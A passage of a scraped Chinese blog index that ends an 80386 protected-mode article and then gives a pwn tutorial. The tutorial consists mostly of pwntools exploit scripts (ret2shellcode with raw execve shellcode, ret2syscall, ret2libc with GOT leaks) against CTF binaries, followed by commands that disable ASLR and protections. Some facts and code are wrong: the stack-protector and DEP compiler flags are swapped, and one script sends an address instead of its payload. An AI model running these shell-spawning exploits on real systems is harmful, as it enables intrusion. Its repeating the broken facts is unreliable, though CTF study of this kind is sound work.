Table)。80386处理器设计成每个任务都有一个独立的LDT。它包含有每个任务私有的代码段、数据段和堆栈段的描述符，也包含该任务所使用的一些门描述符，如任务们和调用门描述符等 和GDTR直接指向内存地址不同，LDTR和CS、DS等段选择器一样只存放索引值，指向局部描述符表内存段对应的描述符在全局描述符表中的位置 随着任务的切换，只要改变LDTR的值，系统当前的局部描述符表LDT也随之切换，这样便于各项任务之间数据的隔离。但GDT并不随着任务的切换而切换 80386的内存分页机制在实模式下寻址的时候，“段寄存器+偏移地址”经过转换计算后得到的地址就是“物理地址”，也就是在物理内存中的实际地址 而保护模式下，“段寄存器+偏移地址”转换后的地址称为“线性地址”而不是“物理地址”。 为什么会有内存分页机制？在单任务的DOS系统中，一个应用程序可以使用所有的空闲内存。程序退出后，操作系统回收所有的碎片内存并且合并成一个大块内存继续供下一个程序使用 内存合并过程中的一个极端情况是当系统中有多个TSR程序时，早装入内存的TSR被卸载后，后装入的TSR会留在内存的中间部位，把空闲内存隔成两个区域 这时应用程序使用的最大内存块只能是这两块内存中较大的一块，无法将它们合并使用 对于一个多任务的操作系统，内存的碎片化是不能容忍的。否则，经过一段时间后，即使空闲内存的总和很大，也可能出现任何一片内存都小到无法装入执行程序的地步，所以多任务操作系统中碎片内存的合并是个很重要的问题 内存分页机制80386处理器的分页机制可以很好地解决这个问题。80386处理器把4KB大小的一块内存当做一“页”内存，每页物理内存可以根据“页目录”和“页表”，随意映射到不同的线性地址上。这样就可以将物理地址不连续的内存的映射连到一起 是否启用内存分页机制是由80386处理器新增的CR0寄存器中的位31（PG位）决定的，如果PG=0，则分页机制不启用，这时所有指令寻址的地址（线性地址）就是系统中实际的物理地址 。当PG=1的时候，80386处理器进入内存分页管理模式，所有的线性地址要经过页表的映射才得到最后的物理地址 不管在哪种模式下，所有寻址指令使用的都是线性地址，程序不用关心数据最后存放的物理内存 页表规定的不仅是地址的映射，同时还规定了页的访问属性，如是否可写、可读和可执行等。 页表可以指定一个页面并不真正映射到物理内存中。这样，访问这个页的指令会引发异常错误。这时，处理器会自动转移到页异常处理程序中去。操作系统可以在异常处理程序中将硬盘上的虚拟内存读到内存中并修改页表重新映射，然后重新执行引发异常的指令。利用这个机制可以在硬件层上支持虚拟内存的实现 Windows的内存安排虚拟内存安排Windows系统一般在硬盘上建立大小为物理内存两倍左右的交换文件用作虚拟内存 利用80386处理器的内存分页机制，交换文件的寻址上可以很方便地作为物理内存。只需要在真正调用的时候将其读入物理内存并同时修改线性地址映射到这块内存即可。同样道理，因为只是映射一个地址，所以被执行的程序也可以不必装入内存，只需要在页表种建立映射关系，真正运行到这段代码才调入内存 Windows是一个分时的多任务操作系统，CPU时间被分成一个个的时间片后分配给不同程序轮流使用。在A程序的时间片种，和这个程序执行无关的部分（B和C等其他程序的代码和数据）并不需要映射到线性地址中 CPU只能看到线性地址（假的），每个程序拥有自己的线性地址（DLL除外） WIN32编程中的重要概念 每个应用程序都有自己的4GB的寻址空间，该空间可存放操作系统、系统DLL和用户DLL的代码，它们之中有各种函数供应用程序调用。再除去其它的一些空间，余下的是应用程序的代码、数据和可以分配的地址空间 不同应用程序的线性地址空间是隔离的，虽然它们在物理内存种同时存在，但在某个程序所属的时间片中，其他应用程序的代码和数据没有被映射到可寻址的线性地址中，所以是不可访问的。所以从编程的角度来看，程序可以使用私有的4GB寻址空间 DLL程序没有自己的私有空间，它们总是被映射到其它应用程序的地址空间中，当做其它应用程序的一部分运行。是为了其它程序调用 从WIN32汇编的角度看内存寻址如果把描述符表以及页表等内容交给用户程序管理是很不安全的。任何权限上开放引发的安全问题都是很严重的，如Windows9X中的中断描述符表是可写的，CIH病毒可利用它将自己的权限 Windows为用户程序的代码段、数据段和堆栈段全部预定义好了段描述符。这些段的起始地址为0，限长为ffffffff，所以用它们可以直接寻址全部的4GB地址空间 程序开始执行的时候，CS，DS，ES和SS都已经指向了正确的描述符，在整个程序的生命周期内，程序员不必改动这些段寄存器，也不必关心它们的值究竟是多少（也无法更改），所以整个程序可以不用出现段寄存器的身影 实模式下的中断或异常处理实模式下的中断和异常服务程序地址存放在中断向量表中 中断向量表位于物理内存中，每个中断向量表是一个xxxxx:yyyy格式的地址，占用4字节 当发生n号异常或n号中断，或者执行到int n指令的时候，CPU首先到内存nx4的地方去取出服务程序的地址aaaa:bbbb 然后将标志寄存器、中断时的CS和IP压入堆栈，接着转移到aaaa:bbbb处执行 保护模式下的中断或异常处理保护模式下，中断或异常处理往往从用户代码切换到操作系统代码中执行。由于保护模式下的代码有优先级之分，因此出现了从优先级低的应用程序转移到优先级高的系统代码中的问题，如果优先级低的代码能够任意调用优先级高的代码，就相当于拥有了高优先级代码的权限。为了使高优先级的代码能够安全地被低优先级的代码调用，保护模式下增加了“门”的概念 “门”指向某个优先级高的程序所规定的入口点，所有优先级低的程序调用优先级高的程序只能通过门重定向，进入门所规定的入口点。这样可以避免低级别的代码从任意位置进入优先级高的程序的问题。保护模式下的中断和异常等服务程序也要从“门”进入，80386的门分为中断门、自陷门和任务门几种 保护模式下把所有的中断描述符放在一起组成“中断描述表IDT”。为此80386处理器引入了一个新的48位寄存器IDTR。IDTR的高32位指定了IDT在内存中的基址（线性地址），低16位指定了IDT的长度，相当于指定了可以支持的中断数量 保护模式下发生异常或中断时，处理器先根据IDTR寄存器得到中断描述符的地址，然后取出n号中断/异常的门描述符，再从描述符中得到中断服务程序的地址xxxx:yyyy，经过段地址转换后得到服务程序的32位线性地址并转移后执行 在Windows中，操作系统使用动态链接库来代替中断服务程序提供系统功能，所以Win32汇编中int指令也就失去了存在的意义。其实那些调用API的指令原本是用int指令实现的 保护机制段的类型检查段的类型是由断描述符指定的，主要属性有是否可执行，是否可读和是否可写等 CS、DS和SS等段选择器是否能装入某种类型的段描述符是有限制的。如不可执行的段不能装入CS；不可读的段不能装入DS与ES等数据段寄存器；不可写的段不能装入SS等 如果段类型检查通不过，则处理器会产生一般性保护异常或堆栈异常 页的类型检查除了可以在段级别上指定整个段是否可读写外，在页表中也可以为每个页指定是否可写 对于特权级下的执行代码，所有的页都是可写的 但对于1、2和3级的代码，还要根据页表中的R/W项决定是否可写，企图对只读的页进行写操作会产生页异常 访问数据时的级别检查优先级低的代码不能访问优先级高的数据段。80386的段描述符中有一个DPL域（描述符优先级），表示这个段可以被访问的最低优先级 而段选择器中含有RPL域（请求优先级），表示当前执行代码的优先级 只有DPL数值上大于或等于RPL值的时候，该段才是可以访问的，否则会产生一般性保护异常 控制转移的检查在处理中，有很多指令可以实现控制转移，如jmp、call、ret、int和iret等指令 但优先级低的代码不能随意转移到优先级高的代码中，所以遇到这些指令的时候，处理器要检查转移的目的位置是否合法 指令集的检查有两类指令可以影响保护机制 第一类是改变GDT、LDT、IDT以及控制寄存器等关键寄存器的指令，称为特权指令 第二类是操作I/O端口的指令以及cli和sti等改变中断允许的指令，称为敏感指令 特权指令只能在优先级0上才能运行，而敏感指令取决于eflags寄存器中的IOPL位。只有IOPL位表示的优先级高于等于当前代码段的优先级时，指令才能执行 I/O操作的保护I/O地址也是受保护的对象。因为通过I/O操作可以绕过系统对很多硬件进行控制 80386可以单独位I/O空间提供保护，每个任务有个TSS（任务状态段）来记录任务切换的信息 TSS中有个I/O允许位图，用来表示对应的I/O端口是否可以操作 Windows7的启动过程开启电源计算系统将会进行加电自检(POST)。如果通过，之后BIOS会读取主引导记录(MBR：被标记为启动设备的硬盘的首扇区)，并传送被Windows7建立的控制编码给MBR 注：硬盘的0磁道的第一个扇区称为MBR，它的大小是512字节，而这个区域可以分为两个部分。第一部分为pre-boot区（预启动区），占446字节；第二部分是Partition Table区（分区表），占66个字节，该区域相当于一个小程序，作用是判断哪个分区被标记为活动分区，然后去读取那个分区的启动区，并运行该区种的代码 MBR他是不属于任何一个操作系统，也不能用操作系统提供的磁盘操作命令来读取它。但我们可以用ROM-BIOS种提供的INT 13H中断的2号功能读出该扇区的内容 启动菜单生成Windows启动管理器读取”启动配置数据存储”(Boot Confi guration Data store)中的信息。此信息包含已经被安装在计算机上的所有操作系统的配置信息。并且用以生成启动菜单 当你在启动菜单中选择下列动作时： 如果选择的是Window7，Windows启动管理器(Windows Boot Manager)运行%SystemRoot%\\System32文件夹中的OS Loader——Winload.exe 如果选择的是自休眠状态恢复Windows7，那么启动管理器将装载Winresume.exe并恢复先前的使用环境 如果选择的是早期版本的Windows，启动管理器将定位系统安装所在的卷，并且加载Windows NT风格的早期OS loader(Ntldr.exe)，生成一个由boot.ini内容决定的启动菜单 核心文件加载及登录Windows7启动时，加载其核心文件Ntoskrnl.exe和hal.dll，从注册表中读取设置并加载驱动程序 接下来将运行Windows会话管理器(smss.exe)并且启动Windows启动程序(Wininit.exe)，本地安全验证(Lsass.exe)与服务(Services.exe)进程，完成后就可以登录系统","categories":[],"tags":[]},{"title":"pwn入门（Basic-ROP）","slug":"pwn╚δ├┼ú¿Basic-ROPú⌐","date":"2020-02-16T15:41:26.000Z","updated":"2020-02-17T07:42:50.000Z","comments":true,"path":"2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/","link":"","permalink":"http://yoursite.com/2020/02/16/pwn╚δ├┼ú¿Basic-ROPú⌐/","excerpt":"","text":"转载自：https://www.yuque.com/hxfqg9/hs80y0/ug9gx5#ueOeL Basic-ROPret2text没啥好说的，看过蒸米的就可以做出来了 exp： 123456from pwn import *p=process(&apos;./ret2text&apos;)sys_addr=0x804863Apayload=&apos;a&apos;*112+p32(sys_addr)p.sendline(payload)p.interactive() ret2shellcode通过有一个复制的函数，会复制到 buf2 这个地方 而且 buf2 所在的是 bss 段 通过 gdb 查看 bss 段可执行，所以把只要把内容写到这个地方，然后返回地址跳转到 bss 段就可以执行 shellcode 掌握了一些 pwntools 的用法 123456789#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2shellcode')shellcode = asm(shellcraft.sh())print shellcraft.sh()buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))print shellcode.ljust(112,'A')sh.interactive() 上面是给出的 exp 等价于下面的，可以发现 shellcraft.sh() 可以生成 shellcode shellcode.ljust(112,’a’) 可以控制垃圾数据与 shellcode 合起来的长度为112 123456789#!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2shellcode&apos;)shellcode = asm(shellcraft.sh())shellcode+=&apos;a&apos;*(112-len(shellcode))print shellcodebuf2_addr = 0x804a080sh.sendline(shellcode + p32(buf2_addr))sh.interactive() sniperoj-pwn100-shellcode-x86-64：23字节shellcode “\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05” 首先根据 gdb 确定偏移，然后把因为有个 leave 指令会破坏前面的，所以前面的填充为脏数据，然后加上返回地址占据的 8 位空间，确定在 buf_addr 后面 24+8 填充 shellcode 12345678910from pwn import *sh = process(&apos;./shellcode&apos;)shellcode_x64 = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;sh.recvuntil(&apos;[&apos;)buf_addr = sh.recvuntil(&apos;]&apos;, drop=True)buf_addr = int(buf_addr, 16)payload = &apos;b&apos; * 24 + p64(buf_addr + 32) + shellcode_x64print payloadsh.sendline(payload)sh.interactive() ret2syscallret2syscall 即控制程序执行系统调用来获取 shell 关于系统调用的知识： Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 应用程序调用系统调用的过程是： 1、把系统调用的编号存入 EAX 2、把函数参数存入其它通用寄存器 3、触发 0x80 号中断（int 0x80） 那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了 如果说想通过系统调用执行的是：execve(&quot;/bin/sh&quot;,NULL,NULL)（32位程序） 那么 eax 寄存器应该放系统调用号，查看 execve 的系统调用号： 1cat /usr/include/asm/unistd_32.h | grep execve 得到 11，转换为 16 进制是 0xb，所以 eax 中应该存放 0xb ebx 应该存放想要执行的 /bin/sh 的地址，还有两个参数设置为 0 所以现在需要做的就是让： eax=0xb ebx=/bin/sh 的地址 ecx=0 edx=0 只需要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的 要用：ROPgadget 来查找 使用命令找到 pop eax：ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39; 类似的，通过这条命令寻找控制其他寄存器的地址，找到可以控制多个的！ 同时使用：ROPgadget --binary rop --string &#39;/bin/sh&#39; 找到 ‘/bin/sh’ 字符串在什么地方 以及需要的 int 0x80：ROPgadget --binary rop --only &#39;int&#39; 有偏移的长度： 最后写出 exp： 1234567891011121314151617181920212223\"\"\"自己写的\"\"\"#!/usr/bin/env pythonfrom pwn import *p=process('./rop')int_addr=0x8049421bin_addr=0x80be408pop_other_ret=0x806eb90pop_eax_ret=0x80bb196payload='a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)p.sendline(payload)p.interactive()\"\"\"ctf-wiki上的\"\"\"from pwn import *sh = process('./rop')pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])#flat模块能将pattern字符串和地址结合并且转为字节模式sh.sendline(payload)sh.interactive() ret2libc例1控制程序执行 libc 中的参数，通常是返回到某个函数的 plt 处，或者某个函数的具体位置（函数对应 got 表项的内容），一般情况会选择执行 system(‘/bin/sh’) 看第一个程序： 得到偏移： 同时找到：/bin/sh 与 system 的地址 构造 exp： 1234567from pwn import *p=process(&apos;./ret2libc1&apos;)bin_addr=0x8048720sys_addr=0x8048460payload=&apos;a&apos;*112 + p32(sys_addr)+p32(1234)+p32(bin_addr)p.sendline(bin_addr)p.interactive() 例2这一个没有了 “/bin/sh” 字符串，需要通过 gets 函数写到一个可读可写的地方，通常会找 bss 段，然后去执行 /bin/sh 通过查找，可以找到的数据如下： sys_addr=0x8048490 get_addr=0x8048460 bss_addr=0x804A080 通过这些数据可以写出 exp： 123456789from pwn import *p=process(&apos;./ret2libc2&apos;)sys_addr=0x8048490get_addr=0x8048460bss_addr=0x804A080payload = &apos;a&apos;*112 +p32(get_addr)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)p.sendline(payload)p.sendline(&apos;/bin/sh&apos;)p.interactive() 例3没有 system 也没有 /bin/sh，需要使用 libc 中的 system 和 /bin/sh，知道了libc中的一个函数的地址就可以确定该程序利用的 libc，从而知道其他函数的地址 获得 libc 的某个函数的地址通常采用的方法是：通过 got 表泄露，但是由于libc的延迟绑定，需要泄露的是已经执行过的函数的地址 总的来说： 1、通过第一次溢出，通过将 puts 的 PLT 地址放到返回处，泄漏出执行过的函数的 GOT 地址（实际上 puts 的就可以） 2、将 puts 的返回地址设置为 _start 函数（main () 函数是用户代码的入口，是对用户而言的；而_start () 函数是系统代码的入口，是程序真正的入口），方便再次用来执行 system(‘/bin/sh’) 3、通过泄露的函数的 GOT 地址计算出 libc 中的 system 和 /bin/sh 的地址 4、再次通过溢出将返回地址覆盖成泄露出来的 system 的地址 getshell 自己写的exp： 12345678910111213141516171819#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *elf=ELF(&apos;ret2libc3&apos;)p=process(&apos;./ret2libc3&apos;)puts_plt=elf.plt[&apos;puts&apos;]puts_got=elf.got[&apos;puts&apos;]start_addr = elf.symbols[&apos;_start&apos;]#gdb.attach(p)payload1=&apos;A&apos;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)p.sendlineafter(&quot;!?&quot;,payload1)puts_addr=u32(p.recv(4))libc=LibcSearcher(&apos;puts&apos;,puts_addr)libcbase=puts_addr-libc.dump(&quot;puts&quot;)system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload2=&apos;A&apos;*112+p32(system_addr)+p32(1234)+p32(binsh_addr)p.sendlineafter(&quot;!?&quot;,payload2)p.interactive() dalao的 exp： 123456789101112131415161718192021222324252627282930313233from pwn import *sh = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)libc = elf.libcputs_plt = elf.plt[&apos;puts&apos;]puts_got = elf.got[&apos;puts&apos;]start_addr = elf.symbols[&apos;_start&apos;]print &quot;[*]puts plt: &quot; + hex(puts_plt)print &quot;[*]puts got: &quot; + hex(puts_got)print &quot;[*]_start addr: &quot; + hex(start_addr)print &quot;[*]libc addr: &quot; + hex(libc.address)print &quot;--&quot; * 20print &quot;[*]sending payload1 to leak libc...&quot;payload = flat([&quot;A&quot; * 112, puts_plt, start_addr, puts_got])sh.sendlineafter(&quot;Can you find it !?&quot;, payload)puts_addr = u32(sh.recv(4))print &quot;[*]leak puts addr: &quot; + hex(puts_addr)libc.address = puts_addr - libc.symbols[&apos;puts&apos;]system_addr = libc.symbols[&apos;system&apos;]binsh_addr = next(libc.search(&apos;/bin/sh&apos;))print &quot;[*]leak libc addr: &quot; + hex(libc.address)print &quot;[*]system addr: &quot; + hex(system_addr)print &quot;[*]binsh addr: &quot; + hex(binsh_addr)print &quot;--&quot; * 20print &quot;[*]sending payload2 to getshell...&quot;payload2 = flat([&quot;B&quot; * 112, system_addr, &quot;CCCC&quot;, binsh_addr])sh.sendline(payload2)sh.interactive() train.cs.nctu.edu.tw：ret2libc这道题开启了 NX 保护，然而运行的时候会把 puts 的地址跟 /bin/sh 的地址告诉我们，使用 pwntools 可以把地址提取出来，再根据 libcsearcher 查出 system 的地址，这样就可以 getshell 了 exp： 123456789101112131415from pwn import *from LibcSearcher import LibcSearcherp=process(&apos;./pwn&apos;)p.recvuntil(&apos;is &apos;)bin_addr = int(p.recvuntil(&apos;\\n), 16)print hex(bin_addr)p.recvuntil(&apos;is &apos;)puts_addr = int(p.recvuntil(&apos;\\n&apos;), 16)print hex(puts_addr)libc=LibcSearcher(&apos;puts&apos;,puts_addr)libc_base=puts_addr-libc.dump(&apos;puts&apos;)sys_addr=libc_base+libc.dump(&apos;system&apos;)payload2=&apos;a&apos;*32+p32(sys_addr)+p32(1234)+p32(bin_addr)p.sendline(payload2)p.interactive() 讲一下 p.recvuntil(&#39;is &#39;) 代表的是 “is “之前的那一块，当下一个 recvuntil 的时候就会把这那块去掉了 把脚本里的第一个 p.recvuntil(&#39;is &#39;) 替换成 12print p.recvuntil(&apos;of &apos;)print p.recvuntil(&apos;is &apos;) 就可以看出来作用是什么 ps.正常会输出这一些（”^C”是ctrl+c退出造成的，不包括）： Linux动态链接参考博文 关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了 PLT&amp;GOTlinux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解 使用如下源代码 test.c： 12345678910#include &lt;stdio.h&gt;void print_banner()&#123; printf(&quot;Welcome to World of PLT and GOT\\n&quot;);&#125;int main(void)&#123; print_banner(); return 0;&#125; 依次使用下列命令进行编译： 12gcc -Wall -g -o test.o -c test.c -m32gcc -o test test.o -m32 这样除了原有的 test.c 还有个 test.o 以及可执行文件 test 通过 objdump -d test.o 可以查看反汇编 printf() 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf() 函数先用 fc ff ff ff 也就是有符号数的 -4 代替 运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？ 链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以 12345678910111213.text...// 调用printf的call指令call printf_stub...printf_stub: mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址 jmp rax // 跳过去执行printf函数.data...printf函数的储存地址,这里储存printf函数重定位后的地址 总体来说，动态链接每个函数需要两个东西： 1、用来存放外部函数地址的数据段 2、用来获取数据段记录的外部函数地址的代码 应有两个表，一个用来存放外部的函数地址的数据表称为全局偏移表（GOT, Global Offset Table），那个存放额外代码的表称为程序链接表（PLT，Procedure Link Table） 可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址 那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制 延迟绑定只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现： 123456789//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址void printf@plt()&#123;address_good: jmp *printf@got lookup_printf: 调用重定位函数查找 printf 地址，并写到 printf@got goto address_good;//再返回去执行address_good&#125; 说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf() 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到printf 来执行了 也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了 接下来，我们就来看一下这个“找”的工作是怎么实现的： 通过 objdump -d test &gt; test.asm 可以看到其中 plt 表项有三条指令 1234567891011121314151617Disassembly of section .plt:080482d0 &lt;common@plt&gt;: 80482d0: ff 35 04 a0 04 08 pushl 0x804a004 80482d6: ff 25 08 a0 04 08 jmp *0x804a008 80482dc: 00 00 add %al,(%eax) ...080482e0 &lt;puts@plt&gt;: 80482e0: ff 25 0c a0 04 08 jmp *0x804a00c 80482e6: 68 00 00 00 00 push $0x0 80482eb: e9 e0 ff ff ff jmp 80482d0 &lt;_init+0x28&gt;080482f0 &lt;__libc_start_main@plt&gt;: 80482f0: ff 25 10 a0 04 08 jmp *0x804a010 80482f6: 68 08 00 00 00 push $0x8 80482fb: e9 d0 ff ff ff jmp 80482d0 &lt;_init+0x28&gt; ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common 其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0 （说一下怎么查看，先 gdb test 然后 b main，再 run， 再 x/x jmp的那个地址 就可以） 还得之前我们说的，在还没有执行过函数之前 printf@got 的内容是 lookup_printf 函数的地址吗，这就是要去找 printf 函数的地址了 现在要做的是： 12push $0x0 //将数据压到栈上，作为将要执行的函数的参数jmp 0x80482d0 //去到了第一个表项 接下来继续 12345080482d0 &lt;common@plt&gt;:pushl 0x804a004 //将数据压到栈上，作为后面函数的参数jmp *0x804a008 //跳转到函数add %al,(%eax) ... 我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0 当执行后他有了值 这个值对应的函数是 _dl_runtime_resolve 那现在做一个小总结： 在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的 xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve 到这里我们还需要知道 _dl_runtime_resolve 是怎么知道要查找 printf 函数的 _dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项 第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址 在 elf文件中 .rel.plt 保存了重定位表的信息，使用 readelf -r test 命令可以查看 test 可执行文件中的重定位信息 这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来 第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址 在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存： got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址 got [1]：本 ELF 的 link_map 数据结构描述符地址 got [2]：_dl_runtime_resolve 函数的地址 动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项 跟着大佬的流程图来走一遍： 第一次调用 之后再次调用 Practicetrain.cs.nctu.edu.tw：rop没找到题目，从大佬博客里面找到的，题目使用 nc 连上以后会输出这些 gadgets 需要自己去构造 payload 把 push 的那一些16进制转换一下 大佬说通过这些就可以构造出 payload 了 exp：我连不上。。。 12345from pwn import *sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,10001)payload = &quot;9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8,0&quot;sh.sendline(payload)sh.interactive() 2013-PlaidCTF-ropasaurusrex没有 system 和 /bin/sh，通过 ret2libc 的方法在libc里面找到，这里注意一下第一次泄露的是 got 表的内容，写成了 plt 的，结果废了两个小时没看出来，还以为又出现了什么超出知识水平的操作，，CTF需要视力！！ exp： 12345678910111213141516from pwn import *from LibcSearcher import LibcSearcherp=process(&apos;./rop&apos;)elf=ELF(&apos;./rop&apos;)write_plt=elf.plt[&apos;write&apos;]write_got=elf.got[&apos;write&apos;]payload=&apos;a&apos;*140+p32(write_plt)+p32(0x80483F4)+p32(1)+p32(write_got)+p32(4)p.sendline(payload)write_addr=u32(p.recv(4))libc=LibcSearcher(&apos;write&apos;,write_addr)libc_base=write_addr-libc.dump(&apos;write&apos;)sys_addr=libc_base+libc.dump(&apos;system&apos;)bin_addr=libc_base+libc.dump(&apos;str_bin_sh&apos;)payload1=&apos;a&apos;*140+p32(sys_addr)+p32(1234)+p32(bin_addr)p.sendline(payload1)p.interactive() Defcon 2015 Qualifier: R0pbabychecksec 检查一下，发现是64位程序，所以参数应该是存储在 rdi 寄存器上 64 位程序当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9 通过 ROPgadget –binary /libc/x86_64-linux-gnu/ libc.so.6 –only “pop|ret” | grep “rdi” 获取到 pop rdi ；ret 的地址： 通过程序自身提供的功能，可以获取到 libc 的地址与任意函数的地址 同时第三个功能存在溢出，经过计算溢出的长度为 8 写 exp： 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *p=process('./pwn')elf=ELF('./pwn')rdi_offset=0x0000000000021102p.recvuntil(': ')p.sendline('2')p.recvuntil('symbol: ')p.sendline('system')p.recvuntil(': ')sys_addr=p.recvuntil('\\n',drop=True)sys_addr=int(sys_addr,16)libc=LibcSearcher('system',sys_addr)libc_base=sys_addr-libc.dump('system')bin_addr=libc_base+libc.dump('str_bin_sh')rdi_addr=libc_base+rdi_offsetpayload='a'*8+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)p.recvuntil(': ')p.sendline('3')p.recvuntil('): ')length=len(payload)print lengthprint str(length)p.sendline(str(length))p.sendline(payload)p.interactive() 大佬的exp： 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *ropbaby = ELF('./pwn')sh = process('./pwn')context.word_size = 64def getfuncaddress(func): sh.recvuntil(': ') sh.sendline('2') sh.recvuntil('symbol: ') sh.sendline(func) sh.recvuntil(': ') addr = sh.recvuntil('\\n', drop=True) return int(addr, 16)def addropbuff(payload): sh.recvuntil(': ') sh.sendline('3') sh.recvuntil('): ') length = len(payload) sh.sendline(str(length)) sh.sendline(payload)rdi_ret_offset = 0x0000000000021102system_addr = getfuncaddress('system')libc = LibcSearcher('system', system_addr)libc_base = system_addr - libc.dump('system')binsh_addr = libc.dump('str_bin_sh') + libc_baserdi_ret = rdi_ret_offset + libc_baseprint hex(system_addr), hex(binsh_addr), hex(rdi_ret)payload = flat(['b' * 8, rdi_ret, binsh_addr, system_addr])addropbuff(payload)sh.interactive()","categories":[],"tags":[]},{"title":"PWN-Tips-1","slug":"PWN-Tips-1","date":"2020-02-14T16:32:06.000Z","updated":"2020-02-15T08:33:50.000Z","comments":true,"path":"2020/02/14/PWN-Tips-1/","link":"","permalink":"http://yoursite.com/2020/02/14/PWN-Tips-1/","excerpt":"","text":"题目源码编译如果希望什么保护都没有的编译命令一般是： 1gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c -m32的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包 -fno-stack-protector会关闭DEP -z execstack会关闭Stack Protector 在root权限下执行，或者sudo执行： 1echo 0 &gt; /proc/sys/kernel/randomize_va_space 这样就关闭掉了整个系统的ASLR gdb调试内存gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行程序的时候，buf的位置会固定在别的地址上，这里采用的方法是开启：core dump 在root权限下执行，或者sudo执行： 1ulimit -c unlimited 开启之后，当出现内存错的时候，系统会生成一个core dump文件在当前目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了，使用gdb调试转储： 1gdb name core 系统调用Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。应用程序调用系统调用的过程是： 把系统调用的编号存入EAX 把函数参数存入其它通用寄存器 触发0x80号中断（int 0x80） 那么我们如果希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行int 0x80就可以了 如果说想通过系统调用执行的是：execve(&quot;/bin/sh&quot;,NULL,NULL)（32位程序） 那么eax寄存器应该存放系统调用号，查看execve的系统调用号： 1cat /usr/include/asm/unistd_32.h | grep execve 可以得到为11，转换为16进制就为0xb，所以eax中应该存放0xb ebx应该存放想要执行的”/bin/sh”的地址，还有两个参数设置为0 所以现在需要做的就是让： eax=0xb ebx=”/bin/sh”的地址 